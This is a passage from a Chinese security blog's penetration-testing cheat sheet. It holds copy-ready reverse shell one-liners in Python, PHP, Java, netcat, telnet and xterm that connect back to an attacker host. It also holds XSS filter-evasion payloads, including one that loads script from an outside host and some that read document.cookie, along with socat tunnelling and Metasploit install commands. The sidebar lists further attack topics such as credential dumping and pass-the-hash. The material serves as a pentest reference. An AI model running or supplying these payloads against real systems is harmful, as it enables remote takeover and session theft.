</code></pre><h2 id="PYTHON-Reverse-Shell"><a href="#PYTHON-Reverse-Shell" class="headerlink" title="PYTHON Reverse Shell"></a>PYTHON Reverse Shell</h2><pre><code>python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;attackerip&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;
</code></pre><h2 id="PHP-Reverse-Shell"><a href="#PHP-Reverse-Shell" class="headerlink" title="PHP Reverse Shell"></a>PHP Reverse Shell</h2><pre><code>php -r &apos;$sock=fsockopen(&quot;attackerip&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;
</code></pre><h2 id="JAVA-Reverse-Shell"><a href="#JAVA-Reverse-Shell" class="headerlink" title="JAVA Reverse Shell"></a>JAVA Reverse Shell</h2><pre><code>r = Runtime.getRuntime()
p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/attackerip/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
p.waitFor()
</code></pre><h2 id="NETCAT-Reverse-Shell"><a href="#NETCAT-Reverse-Shell" class="headerlink" title="NETCAT Reverse Shell"></a>NETCAT Reverse Shell</h2><pre><code>nc -e /bin/sh attackerip 4444
nc -e /bin/sh 192.168.37.10 443

# If the -e option is disabled, try this
# mknod backpipe p &amp;&amp; nc attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe
/bin/sh | nc attackerip 443
rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4443 0/tmp/

# If you have the wrong version of netcat installed, try
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip &gt;/tmp/f
</code></pre><h2 id="TELNET-Reverse-Shell"><a href="#TELNET-Reverse-Shell" class="headerlink" title="TELNET Reverse Shell"></a>TELNET Reverse Shell</h2><pre><code># If netcat is not available or /dev/tcp
mknod backpipe p &amp;&amp; telnet attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe
</code></pre><h2 id="XTERM-Reverse-Shell"><a href="#XTERM-Reverse-Shell" class="headerlink" title="XTERM Reverse Shell"></a>XTERM Reverse Shell</h2><pre><code># Start an open X Server on your system (:1 – which listens on TCP port 6001)
apt-get install xnest
Xnest :1

# Then remember to authorise on your system the target IP to connect to you
xterm -display 127.0.0.1:1

# Run this INSIDE the spawned xterm on the open X Server
xhost +targetip

# Then on the target connect back to the your X Server
xterm -display attackerip:1
/usr/openwin/bin/xterm -display attackerip:1
or
$ DISPLAY=attackerip:0 xterm
</code></pre><h2 id="XSS-Cheat-Codes"><a href="#XSS-Cheat-Codes" class="headerlink" title="XSS Cheat Codes"></a>XSS Cheat Codes</h2><pre><code>https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
(&quot;&lt; iframes &gt; src=http://IP:PORT &lt;/ iframes &gt;&quot;)

&lt;script&gt;document.location=http://IP:PORT&lt;/script&gt;

&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//–&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;

&quot;;!–&quot;&lt;XSS&gt;=&amp;amp;amp;{()}

&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;
&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&quot;&gt;
&lt;IMG SRC=&amp;amp;amp;#106;&amp;amp;amp;#97;&amp;amp;amp;#118;&amp;amp;amp;#97;&amp;amp;amp;#115;&amp;amp;amp;#99;&amp;amp;amp;#114;&amp;amp;amp;#105;&amp;amp;amp;#112;&amp;amp;amp;#116;&amp;amp;amp;#58;&amp;amp;amp;#97;&amp;amp;amp;#108;&amp;amp;amp;#101;&amp;amp;amp;#114;&amp;amp;amp;#116;&amp;amp;amp;#40;&amp;amp;amp;#39;&amp;amp;amp;#88;&amp;amp;amp;#83;&amp;amp;amp;#83;&amp;amp;amp;#39;&amp;amp;amp;#41;&gt;

&lt;IMG SRC=&amp;amp;amp;#0000106&amp;amp;amp;#0000097&amp;amp;amp;#0000118&amp;amp;amp;#0000097&amp;amp;amp;#0000115&amp;amp;amp;#0000099&amp;amp;amp;#0000114&amp;amp;amp;#0000105&amp;amp;amp;#0000112&amp;amp;amp;#0000116&amp;amp;amp;#0000058&amp;amp;amp;#0000097&amp;amp;amp;#0000108&amp;amp;amp;#0000101&amp;amp;amp;#0000114&amp;amp;amp;#0000116&amp;amp;amp;#0000040&amp;amp;amp;#0000039&amp;amp;amp;#0000088&amp;amp;amp;#0000083&amp;amp;amp;#0000083&amp;amp;amp;#0000039&amp;amp;amp;#0000041&gt;
&lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;

perl -e &apos;print &quot;&lt;IMG SRC=javascript:alert(\&quot;XSS\&quot;)&gt;&quot;;&apos; &gt; out

&lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;

(&quot;&gt;&lt; iframes http://google.com &lt; iframes &gt;)

&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;
&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;
&quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;
%253cscript%253ealert(document.cookie)%253c/script%253e
&quot;&gt;&lt;s&quot;%2b&quot;cript&gt;alert(document.cookie)&lt;/script&gt;
%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)&apos;%3E
&lt;img src=asdf onerror=alert(document.cookie)&gt;
</code></pre><h2 id="SSH-Over-SCTP-With-Socat"><a href="#SSH-Over-SCTP-With-Socat" class="headerlink" title="SSH Over SCTP (With Socat)"></a>SSH Over SCTP (With Socat)</h2><pre><code># on remote server
# assuming you want the SCTP socket to listen on port 80/SCTP and sshd is on 22/TCP
$ socat SCTP-LISTEN:80,fork TCP:localhost:22

# localhost
# replace SERVER_IP with IP of listening server, and 80 with whatever port the SCTP listener is on :)
$ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80

# create socks proxy
# replace username and -p port value as needed...
$ ssh -lusername localhost -D 8080 -p 1337
</code></pre><h2 id="Install-Metasploit-Community-Edition-in-Kali-2-0"><a href="#Install-Metasploit-Community-Edition-in-Kali-2-0" class="headerlink" title="Install Metasploit Community Edition in Kali 2.0"></a>Install Metasploit Community Edition in Kali 2.0</h2><pre><code># github urls
https://github.com/rapid7/metasploit-framework/wiki/Downloads-by-Version

wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run &amp;&amp; chmod
+x metasploit-latest-linux-x64-installer.run &amp;&amp; ./metasploit-latest-linux-x64-installer.run

# create user
$ /opt/metasploit/createuser
[*] Please enter a username: root
[*] Creating user &apos;root&apos; with password &apos;LsRRV[I^5&apos; ...

# activate your metasploit license
https://localhost:3790

# update metasploite
$ /opt/metasploit/app/msfupdate

# use msfconsole
$ /opt/metasploit/app/msfconsole
</code></pre><p><a href="https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/#msf-payloads" target="_blank" rel="noopener">https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/#msf-payloads</a></p>
</div><div class="tags"></div><div class="post-share"><div class="bdsharebuttonbox"><span style="float:left;line-height: 28px;height: 28px;font-size:16px;font-weight:blod">分享到：</span><a href="#" data-cmd="more" class="bds_more"></a><a href="#" data-cmd="mshare" title="分享到一键分享" class="bds_mshare"></a><a href="#" data-cmd="fbook" title="分享到Facebook" class="bds_fbook"></a><a href="#" data-cmd="twi" title="分享到Twitter" class="bds_twi"></a><a href="#" data-cmd="linkedin" title="分享到linkedin" class="bds_linkedin"></a><a href="#" data-cmd="youdao" title="分享到有道云笔记" class="bds_youdao"></a><a href="#" data-cmd="evernotecn" title="分享到印象笔记" class="bds_evernotecn"></a><a href="#" data-cmd="weixin" title="分享到微信" class="bds_weixin"></a><a href="#" data-cmd="qzone" title="分享到QQ空间" class="bds_qzone"></a><a href="#" data-cmd="tsina" title="分享到新浪微博" class="bds_tsina"></a></div></div><div class="post-nav"><a href="/2017/06/25/Pentest-Tips-and-Tricks02/" class="pre">Pentest Tips and Tricks02</a><a href="/2017/04/10/nmap最佳扫描策略/" class="next">nmap最佳扫描策略</a></div><div id="comments"></div></div></div></div><div class="layout-r"><div id="sidebar"><div class="search-pla"></div><div id="toc" class="widget"><div class="widget-title"><i class="fa fa-fei">文章目录</i></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pentest-Tips-and-Tricks-01-渗透测试的技巧和窍门"><span class="toc-text">Pentest Tips and Tricks #01(渗透测试的技巧和窍门)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap-Full-Web-Vulnerable-Scan"><span class="toc-text">Nmap Full Web Vulnerable Scan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dirb-Dir-Bruteforce-目录爆破"><span class="toc-text">Dirb Dir Bruteforce(目录爆破)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nikto-web-server-scanner-Niktoweb服务器扫描"><span class="toc-text">Nikto web server scanner(Niktoweb服务器扫描)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WordPress-Scanner-wordpress扫描"><span class="toc-text">WordPress Scanner(wordpress扫描)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-Fingerprinting-HTTP指纹识别"><span class="toc-text">HTTP Fingerprinting(HTTP指纹识别)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SKIP-Fish-Scanner"><span class="toc-text">SKIP Fish Scanner</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap-Ports-Scan"><span class="toc-text">Nmap Ports Scan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NC-Scanning"><span class="toc-text">NC Scanning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unicornscan"><span class="toc-text">Unicornscan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Xprobe2-OS-fingerprinting-指纹识别"><span class="toc-text">Xprobe2 OS fingerprinting(指纹识别)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Samba-Enumeration-samba枚举"><span class="toc-text">Samba Enumeration(samba枚举)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SNMP-Enumeration-SNMP枚举"><span class="toc-text">SNMP Enumeration(SNMP枚举)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-Useful-cmds"><span class="toc-text">Windows Useful cmds</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PuTTY-Link-tunnel-putty链接隧道"><span class="toc-text">PuTTY Link tunnel(putty链接隧道)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Meterpreter-portfwd"><span class="toc-text">Meterpreter portfwd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enable-RDP-Access-激活rdp访问"><span class="toc-text">Enable RDP Access(激活rdp访问)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Turn-Off-Windows-Firewall-关闭windows防火墙"><span class="toc-text">Turn Off Windows Firewall(关闭windows防火墙)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Meterpreter-VNC-RDP"><span class="toc-text">Meterpreter VNC\RDP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Add-New-user-in-Windows"><span class="toc-text">Add New user in Windows</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mimikatz-use"><span class="toc-text">Mimikatz use</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Passing-the-Hash"><span class="toc-text">Passing the Hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hashcat-password-cracking"><span class="toc-text">Hashcat password cracking</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Banner-grabbing-with-NC"><span class="toc-text">Banner grabbing with NC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Window-reverse-shell"><span class="toc-text">Window reverse shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Find-SUID-SGID-root-files"><span class="toc-text">Find SUID\SGID root files</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-shell"><span class="toc-text">Python shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-Ruby-PHP-HTTP-Server"><span class="toc-text">Python\Ruby\PHP HTTP Server</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Get-PIDs-of-process"><span class="toc-text">Get PIDs of process</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hydra-rdp-Bruteforce"><span class="toc-text">Hydra rdp Bruteforce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mount-Remote-Windows-Share"><span class="toc-text">Mount Remote Windows Share</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Compiling-Exploit-in-Kali-在kali上编译漏洞"><span class="toc-text">Compiling Exploit in Kali(在kali上编译漏洞)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Compiling-Windows-Exploits-on-Kali-在kali上编译windows漏洞"><span class="toc-text">Compiling Windows Exploits on Kali(在kali上编译windows漏洞)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NASM-Commands"><span class="toc-text">NASM Commands</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-Pivoting"><span class="toc-text">SSH Pivoting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-Pivoting-from-One-Network-to-Another"><span class="toc-text">SSH Pivoting from One Network to Another</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pivoting-Using-metasploit"><span class="toc-text">Pivoting Using metasploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-DB-search-using-CSV-File"><span class="toc-text">Exploit-DB search using CSV File</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF-Payloads"><span class="toc-text">MSF Payloads</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF-Linux-Reverse-Meterpreter-Binary"><span class="toc-text">MSF Linux Reverse Meterpreter Binary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF-Reverse-Shell-C-Shellcode"><span class="toc-text">MSF Reverse Shell (C Shellcode)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF-Reverse-Shell-Python-Script"><span class="toc-text">MSF Reverse Shell Python Script</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF-Reverse-ASP-Shell"><span class="toc-text">MSF Reverse ASP Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF-Reverse-Bash-Shell"><span class="toc-text">MSF Reverse Bash Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF-Reverse-PHP-Shell"><span class="toc-text">MSF Reverse PHP Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF-Reverse-Win-Bin"><span class="toc-text">MSF Reverse Win Bin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-Security-Commands"><span class="toc-text">Linux Security Commands</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Win-Buffer-Overflow-Exploit-Commands-windows缓冲区溢出漏洞命令"><span class="toc-text">Win Buffer Overflow Exploit Commands(windows缓冲区溢出漏洞命令)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SEH-Structured-Exception-Handling-结构化异常处理"><span class="toc-text">SEH - Structured Exception Handling(结构化异常处理)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP-DEP"><span class="toc-text">ROP (DEP)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ASLR-Address-space-layout-randomization-ASLR地址空间布局随机化"><span class="toc-text">ASLR - Address space layout randomization(ASLR地址空间布局随机化)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EGG-Hunter-techniques"><span class="toc-text">EGG Hunter techniques</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GDB-Debugger-Commands"><span class="toc-text">GDB Debugger Commands</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BASH-Reverse-Shell"><span class="toc-text">BASH Reverse Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PERL-Reverse-Shell"><span class="toc-text">PERL Reverse Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RUBY-Reverse-Shell"><span class="toc-text">RUBY Reverse Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PYTHON-Reverse-Shell"><span class="toc-text">PYTHON Reverse Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-Reverse-Shell"><span class="toc-text">PHP Reverse Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA-Reverse-Shell"><span class="toc-text">JAVA Reverse Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NETCAT-Reverse-Shell"><span class="toc-text">NETCAT Reverse Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TELNET-Reverse-Shell"><span class="toc-text">TELNET Reverse Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XTERM-Reverse-Shell"><span class="toc-text">XTERM Reverse Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-Cheat-Codes"><span class="toc-text">XSS Cheat Codes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-Over-SCTP-With-Socat"><span class="toc-text">SSH Over SCTP (With Socat)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Install-Metasploit-Community-Edition-in-Kali-2-0"><span class="toc-text">Install Metasploit Community Edition in Kali 2.0</span></a></li></ol></li></ol></div><div class="widget"><div class="widget-title"><i class="fa fa-xie"> 最新文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/07/18/logcat命令行工具/">logcat命令行工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/17/如何寻找真实ip/">如何寻找真实ip</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/16/linux安装metasploit/">linux安装metasploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/15/Mobile-Security-Framework-MobSF/">Mobile-Security-Framework-MobSF</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/14/linux就该这么学-3/">linux就该这么学-3</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/13/linux就该这么学-2/">linux就该这么学-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/12/linux就该这么学-1/">linux就该这么学-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/10/突然间失落/">突然间失落</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/09/hello-world/">Hello World</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/黑客与画家-三-不能说的话/">黑客与画家-三-不能说的话</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-gui"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/书籍分享/">书籍分享</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/学习/">学习</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a><span class="category-list-count">18</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞描述/">漏洞描述</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/阅读/">阅读</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/随笔/">随笔</a><span class="category-list-count">3</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-biao"> 标签</i></div><div class="tagcloud"><a href="/tags/web信息收集/" style="font-size: 15px;">web信息收集</a> <a href="/tags/burp-suite/" style="font-size: 15px;">burp suite</a> <a href="/tags/crond-crondtab/" style="font-size: 15px;">crond,crondtab</a> <a href="/tags/nmap/" style="font-size: 15px;">nmap</a> <a href="/tags/sqlmap/" style="font-size: 15px;">sqlmap</a> <a href="/tags/渗透/" style="font-size: 15px;">渗透</a> <a href="/tags/web后门/" style="font-size: 15px;">web后门</a> <a href="/tags/crondtab/" style="font-size: 15px;">crondtab</a> <a href="/tags/书籍/" style="font-size: 15px;">书籍</a> <a href="/tags/web安全/" style="font-size: 15px;">web安全</a> <a href="/tags/漏洞描述-解决建议/" style="font-size: 15px;">漏洞描述 解决建议</a> <a href="/tags/移动应用/" style="font-size: 15px;">移动应用</a> <a href="/tags/系统漏洞/" style="font-size: 15px;">系统漏洞</a> <a href="/tags/勒索软件/" style="font-size: 15px;">勒索软件</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-archive"> 归档</i></div><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">七月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">五月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">四月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">三月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">二月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">一月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">十二月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">十一月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">十月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">九月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">八月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">七月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">六月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">四月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">三月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">一月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">十一月 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">十月 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">九月 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">八月 2016</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-you"> 友情链接</i></div><ul></ul><a href="http://www.ggsec.cn/" title="ggsec" target="_blank">ggsec</a><ul></ul><a href="http://www.secice.cn/" title="iceH_Blog" target="_blank">iceH_Blog</a><ul></ul><a href="http://www.errorsec.top/" title="errorsec" target="_blank">errorsec</a><ul></ul><a href="http://www.doubleyi.xin/" title="DOUBLE翊" target="_blank">DOUBLE翊</a></div></div></div></div><a id="totop" href="#top"></a><div id="footer"><div class="footer-info"><p><a href="/baidusitemap.xml">Baidu Site Haritası</a> |  <a href="/atom.xml">订阅</a> |  <a href="/about/">关于</a></p><p>本站总访问量：<i id="busuanzi_container_site_pv"><i id="busuanzi_value_site_pv"></i></i>次</p><p><span> Copyright &copy;<a href="/." rel="nofollow">凉城Lc.</a></span><span> Theme by<a rel="nofollow" target="_blank" href="https://github.com/chaooo/hexo-theme-BlueLake"> BlueLake.</a></span><span> Count by<a href="http://busuanzi.ibruce.info/"> busuanzi.</a></span><span> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a></span></p></div></div></div><script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="/js/search.json.js?v=2.0.1"></script><script type="text/javascript" src="/js/toctotop.js?v=2.0.1" async></script><script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":["mshare","weixin","tsina","qzone","linkedin","fbook","twi","print","renren","sqq","evernotecn","bdysc","tqq","tqf","bdxc","kaixin001","tieba","douban","bdhome","thx","ibaidu","meilishuo","mogujie","diandian","huaban","duitang","hx","fx","youdao","sdo","qingbiji","people","xinhua","mail","isohu","yaolan","wealink","ty","iguba","h163","copy"],"bdPic":"","bdStyle":"1","bdSize":"16"},"share":{},"image":{"viewList":["tsina","qzone","weixin","fbook","twi","linkedin","youdao","evernotecn","mshare"],"viewText":"分享到：","viewSize":"16"},"selectShare":{"bdContainerClass":null,"bdSelectMiniList":["tsina","qzone","weixin","fbook","twi","linkedin","youdao","evernotecn","mshare"]}};with(document)0[(getElementsByTagName('head')[0]||head).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
</script></body></html>